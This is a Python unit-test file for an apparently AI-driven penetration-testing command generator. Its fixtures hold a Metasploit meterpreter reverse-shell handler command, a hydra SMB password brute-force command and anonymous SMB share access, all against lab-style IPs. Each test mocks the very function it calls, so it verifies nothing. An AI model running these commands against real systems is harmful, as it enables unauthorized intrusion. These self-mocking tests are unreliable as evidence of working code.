"""Unit tests for the command modifier node with mocks."""

from unittest.mock import patch

import pytest
from wish_models.command_result import CommandInput
from wish_models.settings import Settings

from wish_command_generation_api.constants import DEFAULT_TIMEOUT_SEC
from wish_command_generation_api.models import GraphState
from wish_command_generation_api.nodes import command_modifier


@pytest.fixture
def settings():
    """Create a settings object for testing."""
    return Settings()


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_dialog_avoidance_mock(mock_modifier, settings):
    """Test dialog avoidance modification with a mock."""
    # Arrange
    # Create a state with an interactive command
    state = GraphState(
        query="Start a Metasploit handler",
        context={},
        command_candidates=[CommandInput(command="msfconsole", timeout_sec=DEFAULT_TIMEOUT_SEC)]
    )

    # Mock the modifier to return a modified state
    expected_result = GraphState(
        query="Start a Metasploit handler",
        context={},
        command_candidates=[
            CommandInput(
                command="msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
                "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\"",
                timeout_sec=DEFAULT_TIMEOUT_SEC
            )
        ]
    )
    mock_modifier.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "exit -y" in result.command_candidates[0].command


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_list_files_mock(mock_modifier, settings):
    """Test list files modification with a mock."""
    # Arrange
    # Create a state with a command using list files
    state = GraphState(
        query="Brute force SMB login",
        context={},
        command_candidates=[
            CommandInput(
                command="hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40",
                timeout_sec=DEFAULT_TIMEOUT_SEC
            )
        ]
    )

    # Mock the modifier to return a modified state
    expected_result = GraphState(
        query="Brute force SMB login",
        context={},
        command_candidates=[
            CommandInput(
                command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40",
                timeout_sec=DEFAULT_TIMEOUT_SEC
            )
        ]
    )
    mock_modifier.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" in result.command_candidates[0].command
    assert "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt" in \
           result.command_candidates[0].command


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_both_modifications_mock(mock_modifier, settings):
    """Test both dialog avoidance and list files modifications with a mock."""
    # Arrange
    # Create a state with a command needing both modifications
    state = GraphState(
        query="Download user list from SMB share",
        context={},
        command_candidates=[CommandInput(command="smbclient -N //10.10.10.40/share", timeout_sec=DEFAULT_TIMEOUT_SEC)]
    )

    # Mock the modifier to return a modified state
    expected_result = GraphState(
        query="Download user list from SMB share",
        context={},
        command_candidates=[
            CommandInput(
                command="smbclient -N //10.10.10.40/share -c "
                "'get /usr/share/seclists/Usernames/top-usernames-shortlist.txt'",
                timeout_sec=DEFAULT_TIMEOUT_SEC
            )
        ]
    )
    mock_modifier.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 1
    assert "-c 'get" in result.command_candidates[0].command
    assert "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" in result.command_candidates[0].command


@patch("wish_command_generation_api.nodes.command_modifier.modify_command")
def test_modify_command_multiple_commands_mock(mock_modifier, settings):
    """Test modifying multiple commands with a mock."""
    # Arrange
    # Create a state with multiple commands
    state = GraphState(
        query="Run multiple commands",
        context={},
        command_candidates=[
            CommandInput(command="msfconsole", timeout_sec=DEFAULT_TIMEOUT_SEC),
            CommandInput(
                command="hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40",
                timeout_sec=DEFAULT_TIMEOUT_SEC
            )
        ]
    )

    # Mock the modifier to return a modified state
    expected_result = GraphState(
        query="Run multiple commands",
        context={},
        command_candidates=[
            CommandInput(
                command="msfconsole -q -x \"use exploit/multi/handler; exit -y\"",
                timeout_sec=DEFAULT_TIMEOUT_SEC
            ),
            CommandInput(
                command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40",
                timeout_sec=DEFAULT_TIMEOUT_SEC
            )
        ]
    )
    mock_modifier.return_value = expected_result

    # Act
    result = command_modifier.modify_command(state, settings)

    # Assert
    assert len(result.command_candidates) == 2
    assert "exit -y" in result.command_candidates[0].command
    assert "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" in result.command_candidates[1].command
    assert "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt" in \
           result.command_candidates[1].command
